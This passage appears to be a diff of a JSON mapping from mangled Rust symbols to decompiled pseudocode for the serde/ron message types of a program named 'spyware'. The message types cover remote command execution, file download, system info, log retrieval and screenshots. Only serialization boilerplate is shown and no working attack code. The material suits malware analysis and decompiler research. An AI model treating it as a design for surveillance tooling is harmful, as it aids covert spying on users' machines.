v3;\n    *(_DWORD *)(a1 + 4) = v4;\n    *(_QWORD *)(a1 + 8) = v5;\n    *(_BYTE *)(a1 + 16) = v6;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..RunCommandRequest$GT$11deserialize17hf4107a861e3d2baeE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::RunCommandRequest>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(\n    a1,\n    a2,\n    aRuncommandrequ,\n    17LL,\n    &off_B8EA0,\n    2LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_104_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..RunCommandResponse$GT$9serialize17hc9c819935a81fe1bE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::RunCommandResponse>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v4; // ecx\n  __int64 v5; // rdx\n  __int8 v6; // si\n  __int128 v7; // xmm0\n  __int128 v8; // xmm1\n  __int128 v10; // [rsp+8h] [rbp-50h] BYREF\n  __m256i v11; // [rsp+18h] [rbp-40h]\n  __int64 v12; // [rsp+38h] [rbp-20h] BYREF\n  unsigned __int8 v13; // [rsp+40h] [rbp-18h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(&v10, a3, aRuncommandresp, 18LL, 2LL);\n  v3 = v10;\n  if ( (_DWORD)v10 == 33 )\n  {\n    v12 = *((_QWORD *)&v10 + 1);\n    v13 = v11.m256i_i8[0];\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aOutput_0, 6LL, a2);\n    if ( (_DWORD)v10 == 33\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(\n            &v10,\n            &v12,\n            aErrorInfo_0,\n            10LL,\n            a2 + 24),\n          (_DWORD)v10 == 33) )\n    {\n      <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v12, v13);\n    }\n    else\n    {\n      v7 = v10;\n      v8 = *(_OWORD *)v11.m256i_i8;\n      *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n      *(_OWORD *)(a1 + 16) = v8;\n      *(_OWORD *)a1 = v7;\n    }\n  }\n  else\n  {\n    v4 = DWORD1(v10);\n    v5 = *((_QWORD *)&v10 + 1);\n    v6 = v11.m256i_i8[0];\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)&v11.m256i_i8[1];\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v4;\n    *(_QWORD *)(a1 + 8) = v5;\n    *(_BYTE *)(a1 + 16) = v6;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..RunCommandResponse$GT$11deserialize17h67b73dba800a3318E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::RunCommandResponse>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(\n    a1,\n    a2,\n    aRuncommandresp,\n    18LL,\n    &off_B8EC0,\n    2LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DownloadFileRequest$GT$9serialize17h54b8d5981f6378f4E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::DownloadFileRequest>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v4; // ecx\n  __int64 v5; // rdx\n  __int8 v6; // si\n  __int128 v7; // xmm0\n  __int128 v8; // xmm1\n  __int64 v10; // [rsp+8h] [rbp-50h] BYREF\n  unsigned __int8 v11; // [rsp+10h] [rbp-48h]\n  __int128 v12; // [rsp+18h] [rbp-40h] BYREF\n  __m256i v13; // [rsp+28h] [rbp-30h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(&v12, a3, aDownloadfilere, 19LL, 1LL);\n  v3 = v12;\n  if ( (_DWORD)v12 == 33 )\n  {\n    v10 = *((_QWORD *)&v12 + 1);\n    v11 = v13.m256i_i8[0];\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v12, &v10, aPath, 4LL, a2);\n    if ( (_DWORD)v12 == 33 )\n    {\n      <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v10, v11);\n    }\n    else\n    {\n      v7 = v12;\n      v8 = *(_OWORD *)v13.m256i_i8;\n      *(_OWORD *)(a1 + 32) = *(_OWORD *)&v13.m256i_u64[2];\n      *(_OWORD *)(a1 + 16) = v8;\n      *(_OWORD *)a1 = v7;\n    }\n  }\n  else\n  {\n    v4 = DWORD1(v12);\n    v5 = *((_QWORD *)&v12 + 1);\n    v6 = v13.m256i_i8[0];\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v13.m256i_u64[2];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)&v13.m256i_i8[1];\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v4;\n    *(_QWORD *)(a1 + 8) = v5;\n    *(_BYTE *)(a1 + 16) = v6;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DownloadFileRequest$GT$11deserialize17h40c06322ea6d693bE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::DownloadFileRequest>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(\n    a1,\n    a2,\n    aDownloadfilere,\n    19LL,\n    &off_B8EE0,\n    1LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DownloadFileResponse$GT$9serialize17hacec97a4be0cc2f5E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::DownloadFileResponse>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v4; // ecx\n  __int64 v5; // rdx\n  __int8 v6; // si\n  __int128 v7; // xmm0\n  __int128 v8; // xmm1\n  __int128 v10; // [rsp+8h] [rbp-50h] BYREF\n  __m256i v11; // [rsp+18h] [rbp-40h]\n  __int64 v12; // [rsp+38h] [rbp-20h] BYREF\n  unsigned __int8 v13; // [rsp+40h] [rbp-18h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(&v10, a3, aDownloadfilere_0, 20LL, 2LL);\n  v3 = v10;\n  if ( (_DWORD)v10 == 33 )\n  {\n    v12 = *((_QWORD *)&v10 + 1);\n    v13 = v11.m256i_i8[0];\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aFileData_0, 9LL, a2);\n    if ( (_DWORD)v10 == 33\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(\n            &v10,\n            &v12,\n            aErrorInfo_0,\n            10LL,\n            a2 + 24),\n          (_DWORD)v10 == 33) )\n    {\n      <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v12, v13);\n    }\n    else\n    {\n      v7 = v10;\n      v8 = *(_OWORD *)v11.m256i_i8;\n      *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n      *(_OWORD *)(a1 + 16) = v8;\n      *(_OWORD *)a1 = v7;\n    }\n  }\n  else\n  {\n    v4 = DWORD1(v10);\n    v5 = *((_QWORD *)&v10 + 1);\n    v6 = v11.m256i_i8[0];\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)&v11.m256i_i8[1];\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v4;\n    *(_QWORD *)(a1 + 8) = v5;\n    *(_BYTE *)(a1 + 16) = v6;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..DownloadFileResponse$GT$11deserialize17h11c5c4e17211802eE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::DownloadFileResponse>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(\n    a1,\n    a2,\n    aDownloadfilere_0,\n    20LL,\n    &off_B8EF0,\n    2LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_105_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetBasicInfoRequest$GT$9serialize17h0b9495116de8f9c4E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetBasicInfoRequest>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v4; // ecx\n  __int64 v5; // rdx\n  __int8 v6; // si\n  __int128 v7; // xmm0\n  __int128 v8; // xmm1\n  __int64 v10; // [rsp+8h] [rbp-50h] BYREF\n  unsigned __int8 v11; // [rsp+10h] [rbp-48h]\n  __int128 v12; // [rsp+18h] [rbp-40h] BYREF\n  __m256i v13; // [rsp+28h] [rbp-30h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(&v12, a3, aGetbasicinfore, 19LL, 1LL);\n  v3 = v12;\n  if ( (_DWORD)v12 == 33 )\n  {\n    v10 = *((_QWORD *)&v12 + 1);\n    v11 = v13.m256i_i8[0];\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v12, &v10, aPlaceholder_0, 11LL, a2);\n    if ( (_DWORD)v12 == 33 )\n    {\n      <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v10, v11);\n    }\n    else\n    {\n      v7 = v12;\n      v8 = *(_OWORD *)v13.m256i_i8;\n      *(_OWORD *)(a1 + 32) = *(_OWORD *)&v13.m256i_u64[2];\n      *(_OWORD *)(a1 + 16) = v8;\n      *(_OWORD *)a1 = v7;\n    }\n  }\n  else\n  {\n    v4 = DWORD1(v12);\n    v5 = *((_QWORD *)&v12 + 1);\n    v6 = v13.m256i_i8[0];\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v13.m256i_u64[2];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)&v13.m256i_i8[1];\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v4;\n    *(_QWORD *)(a1 + 8) = v5;\n    *(_BYTE *)(a1 + 16) = v6;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetBasicInfoRequest$GT$11deserialize17hcdf93e6675e0bf2cE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetBasicInfoRequest>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(\n    a1,\n    a2,\n    aGetbasicinfore,\n    19LL,\n    &off_B8F10,\n    1LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..OperatingSystem$GT$9serialize17h8cffced7504157a5E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::OperatingSystem>::serialize(\n        __int64 a1,\n        _BYTE *a2,\n        int a3)\n{\n  switch ( *a2 )\n  {\n    case 0:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aOperatingsyste,\n        15,\n        0,\n        (unsigned int)aWindows,\n        7LL);\n      break;\n    case 1:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aOperatingsyste,\n        15,\n        1,\n        (unsigned int)aLinux,\n        5LL);\n      break;\n    case 2:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aOperatingsyste,\n        15,\n        2,\n        (unsigned int)aFreebsd,\n        7LL);\n      break;\n    case 3:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aOperatingsyste,\n        15,\n        3,\n        (unsigned int)aMacos,\n        5LL);\n      break;\n    case 4:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aOperatingsyste,\n        15,\n        4,\n        (unsigned int)aIos,\n        3LL);\n      break;\n    case 5:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aOperatingsyste,\n        15,\n        5,\n        (unsigned int)aAndroid,\n        7LL);\n      break;\n    case 6:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aOperatingsyste,\n        15,\n        6,\n        (unsigned int)aUnknown,\n        7LL);\n      break;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_102_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..OperatingSystem$GT$11deserialize17h4c0914be652651d6E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::OperatingSystem>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::tag::TagDeserializer as serde::de::Deserializer>::deserialize_enum(\n    a1,\n    a2,\n    aOperatingsyste,\n    15LL,\n    &off_B8F20,\n    7LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_98_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..Architecture$GT$9serialize17ha11211a0fbb1410aE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::Architecture>::serialize(\n        __int64 a1,\n        _BYTE *a2,\n        int a3)\n{\n  switch ( *a2 )\n  {\n    case 0:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aArchitecture,\n        12,\n        0,\n        (unsigned int)aX86,\n        3LL);\n      break;\n    case 1:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aArchitecture,\n        12,\n        1,\n        (unsigned int)aX8664,\n        6LL);\n      break;\n    case 2:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aArchitecture,\n        12,\n        2,\n        (unsigned int)aMips,\n        4LL);\n      break;\n    case 3:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aArchitecture,\n        12,\n        3,\n        (unsigned int)aPowerpc,\n        7LL);\n      break;\n    case 4:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aArchitecture,\n        12,\n        4,\n        (unsigned int)aPowerpc64,\n        9LL);\n      break;\n    case 5:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aArchitecture,\n        12,\n        5,\n        (unsigned int)aArm,\n        3LL);\n      break;\n    case 6:\n      <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n        a1,\n        a3,\n        (unsigned int)aArchitecture,\n        12,\n        6,\n        (unsigned int)aAarch64,\n        7LL);\n      break;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_99_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..Architecture$GT$11deserialize17h009a6242e6b769c4E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::Architecture>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::tag::TagDeserializer as serde::de::Deserializer>::deserialize_enum(\n    a1,\n    a2,\n    aArchitecture,\n    12LL,\n    &off_B8F90,\n    7LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_98_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..PointerWidth$GT$9serialize17h41945df7b7138b6dE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::PointerWidth>::serialize(\n        __int64 a1,\n        _BYTE *a2,\n        int a3)\n{\n  if ( *a2 )\n    <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n      a1,\n      a3,\n      (unsigned int)aPointerwidth,\n      12,\n      1,\n      (unsigned int)aBit64,\n      5LL);\n  else\n    <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_unit_variant(\n      a1,\n      a3,\n      (unsigned int)aPointerwidth,\n      12,\n      0,\n      (unsigned int)aBit32,\n      5LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_99_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..PointerWidth$GT$11deserialize17ha507b2eb88982b6aE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::PointerWidth>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::tag::TagDeserializer as serde::de::Deserializer>::deserialize_enum(\n    a1,\n    a2,\n    aPointerwidth,\n    12LL,\n    &off_B9000,\n    2LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetBasicInfoResponse$GT$9serialize17h190e21248ceaec03E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetBasicInfoResponse>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v4; // ecx\n  __int64 v5; // rdx\n  __int8 v6; // si\n  __int128 v7; // xmm0\n  __int128 v8; // xmm1\n  __int128 v10; // [rsp+8h] [rbp-50h] BYREF\n  __m256i v11; // [rsp+18h] [rbp-40h]\n  __int64 v12; // [rsp+38h] [rbp-20h] BYREF\n  unsigned __int8 v13; // [rsp+40h] [rbp-18h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(&v10, a3, aGetbasicinfore_0, 20LL, 6LL);\n  v3 = v10;\n  if ( (_DWORD)v10 == 33 )\n  {\n    v12 = *((_QWORD *)&v10 + 1);\n    v13 = v11.m256i_i8[0];\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aVersion_0, 7LL, a2 + 56);\n    if ( (_DWORD)v10 == 33\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aArch, 4LL, a2 + 61),\n          (_DWORD)v10 == 33)\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aTargetOs_0, 9LL, a2 + 62),\n          (_DWORD)v10 == 33)\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(\n            &v10,\n            &v12,\n            aOperatingSyste_0,\n            24LL,\n            a2),\n          (_DWORD)v10 == 33)\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(\n            &v10,\n            &v12,\n            aPointerWidth_0,\n            13LL,\n            a2 + 60),\n          (_DWORD)v10 == 33)\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(\n            &v10,\n            &v12,\n            aErrorInfo_0,\n            10LL,\n            a2 + 24),\n          (_DWORD)v10 == 33) )\n    {\n      <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v12, v13);\n    }\n    else\n    {\n      v7 = v10;\n      v8 = *(_OWORD *)v11.m256i_i8;\n      *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n      *(_OWORD *)(a1 + 16) = v8;\n      *(_OWORD *)a1 = v7;\n    }\n  }\n  else\n  {\n    v4 = DWORD1(v10);\n    v5 = *((_QWORD *)&v10 + 1);\n    v6 = v11.m256i_i8[0];\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)&v11.m256i_i8[1];\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v4;\n    *(_QWORD *)(a1 + 8) = v5;\n    *(_BYTE *)(a1 + 16) = v6;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetBasicInfoResponse$GT$11deserialize17hd883d2cf07aad750E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetBasicInfoResponse>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(\n    a1,\n    a2,\n    aGetbasicinfore_0,\n    20LL,\n    &off_B9020,\n    6LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_100_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetLogsRequest$GT$9serialize17he6158cb9ea855423E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetLogsRequest>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v5; // ecx\n  __int64 v6; // rdx\n  unsigned __int8 v7; // si\n  _DWORD v8[2]; // [rsp+0h] [rbp-38h] BYREF\n  __int64 v9; // [rsp+8h] [rbp-30h]\n  unsigned __int8 v10; // [rsp+10h] [rbp-28h]\n  _BYTE v11[31]; // [rsp+11h] [rbp-27h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(v8, a3, aGetlogsrequest, 14LL, 0LL);\n  v3 = v8[0];\n  if ( v8[0] == 33 )\n  {\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v9, v10);\n  }\n  else\n  {\n    v5 = v8[1];\n    v6 = v9;\n    v7 = v10;\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11[15];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)v11;\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v5;\n    *(_QWORD *)(a1 + 8) = v6;\n    *(_BYTE *)(a1 + 16) = v7;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetLogsRequest$GT$11deserialize17hb5de4e1218b29ce4E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetLogsRequest>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(a1, a2, aGetlogsrequest, 14LL, 8LL, 0LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_101_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetLogsResponse$GT$9serialize17h0611f531c13c311fE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetLogsResponse>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v4; // ecx\n  __int64 v5; // rdx\n  __int8 v6; // si\n  __int128 v7; // xmm0\n  __int128 v8; // xmm1\n  __int128 v10; // [rsp+8h] [rbp-50h] BYREF\n  __m256i v11; // [rsp+18h] [rbp-40h]\n  __int64 v12; // [rsp+38h] [rbp-20h] BYREF\n  unsigned __int8 v13; // [rsp+40h] [rbp-18h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(&v10, a3, aGetlogsrespons, 15LL, 2LL);\n  v3 = v10;\n  if ( (_DWORD)v10 == 33 )\n  {\n    v12 = *((_QWORD *)&v10 + 1);\n    v13 = v11.m256i_i8[0];\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v10, &v12, aLogs, 4LL, a2);\n    if ( (_DWORD)v10 == 33\n      && (<ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(\n            &v10,\n            &v12,\n            aErrorInfo_0,\n            10LL,\n            a2 + 24),\n          (_DWORD)v10 == 33) )\n    {\n      <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v12, v13);\n    }\n    else\n    {\n      v7 = v10;\n      v8 = *(_OWORD *)v11.m256i_i8;\n      *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n      *(_OWORD *)(a1 + 16) = v8;\n      *(_OWORD *)a1 = v7;\n    }\n  }\n  else\n  {\n    v4 = DWORD1(v10);\n    v5 = *((_QWORD *)&v10 + 1);\n    v6 = v11.m256i_i8[0];\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11.m256i_u64[2];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)&v11.m256i_i8[1];\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v4;\n    *(_QWORD *)(a1 + 8) = v5;\n    *(_BYTE *)(a1 + 16) = v6;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_102_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetLogsResponse$GT$11deserialize17hb2af3bb6c4c5294eE": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetLogsResponse>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(\n    a1,\n    a2,\n    aGetlogsrespons,\n    15LL,\n    &off_B9080,\n    2LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_106_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..GetScreenshotRequest$GT$9serialize17hbb0030a4e5e27df6E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetScreenshotRequest>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v5; // ecx\n  __int64 v6; // rdx\n  unsigned __int8 v7; // si\n  _DWORD v8[2]; // [rsp+0h] [rbp-38h] BYREF\n  __int64 v9; // [rsp+8h] [rbp-30h]\n  unsigned __int8 v10; // [rsp+10h] [rbp-28h]\n  _BYTE v11[31]; // [rsp+11h] [rbp-27h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(v8, a3, aGetscreenshotr, 20LL, 0LL);\n  v3 = v8[0];\n  if ( v8[0] == 33 )\n  {\n    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a1, v9, v10);\n  }\n  else\n  {\n    v5 = v8[1];\n    v6 = v9;\n    v7 = v10;\n    *(_OWORD *)(a1 + 32) = *(_OWORD *)&v11[15];\n    *(_OWORD *)(a1 + 17) = *(_OWORD *)v11;\n    *(_DWORD *)a1 = v3;\n    *(_DWORD *)(a1 + 4) = v5;\n    *(_QWORD *)(a1 + 8) = v6;\n    *(_BYTE *)(a1 + 16) = v7;\n  }\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_107_$LT$impl$u20$serde..de..Deserialize$u20$for$u20$spyware..communication..messages..GetScreenshotRequest$GT$11deserialize17h10c33b48cca6c544E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::de::Deserialize for spyware::communication::messages::GetScreenshotRequest>::deserialize(\n        __int64 a1,\n        __int64 a2)\n{\n  <&mut ron::de::Deserializer as serde::de::Deserializer>::deserialize_struct(a1, a2, aGetscreenshotr, 20LL, 8LL, 0LL);\n  return a1;\n}",
+    "_ZN7spyware13communication8messages1_103_$LT$impl$u20$serde..ser..Serialize$u20$for$u20$spyware..communication..messages..DisplayScreenshot$GT$9serialize17h398c010cbc9d0042E": "__int64 __fastcall spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::DisplayScreenshot>::serialize(\n        __int64 a1,\n        __int64 a2,\n        __int64 a3)\n{\n  int v3; // eax\n  int v4; // ecx\n  __int64 v5; // rdx\n  __int8 v6; // si\n  __int128 v7; // xmm0\n  __int128 v8; // xmm1\n  __int128 v10; // [rsp+8h] [rbp-50h] BYREF\n  __m256i v11; // [rsp+18h] [rbp-40h]\n  __int64 v12; // [rsp+38h] [rbp-20h] BYREF\n  unsigned __int8 v13; // [rsp+40h] [rbp-18h]\n\n  <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(&v10, a3, aDisplayscreens, 17LL, 3LL);\n  v3 = v10;\n  if ( (_DWORD)v10 == 33 )\n  {\n    v12 = *((_QWORD *)&v10 + 1);\n    v13 = v11.m256i_i8[0];\n    <ron::ser::Compound<W> as 